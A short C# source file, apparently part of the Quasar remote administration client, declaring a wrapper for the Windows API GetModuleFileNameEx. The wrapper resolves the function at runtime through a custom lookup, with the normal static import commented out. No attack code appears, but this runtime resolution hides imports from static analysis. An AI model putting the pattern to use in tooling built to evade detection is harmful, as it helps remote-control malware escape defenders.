using Microsoft.Win32.SafeHandles;
using Quasar.Client.Utilities;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Text;

namespace Quasar.Client.Win32PE.Structs
{
    public static partial class NativeMethods
    {
        //[DllImport("psapi.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal delegate uint GetModuleFileNameExProc(IntPtr hProcess,
            IntPtr hModule,
            [Out] StringBuilder lpBaseName,
            [In][MarshalAs(UnmanagedType.U4)] int nSize);
        internal static uint GetModuleFileNameEx(IntPtr hProcess,
            IntPtr hModule,
            [Out] StringBuilder lpBaseName,
            [In][MarshalAs(UnmanagedType.U4)] int nSize) => ClientNatives.Lookup<GetModuleFileNameExProc>("psapi.dll", "GetModuleFileNameEx")(hProcess, hModule, lpBaseName, nSize);
    }
}
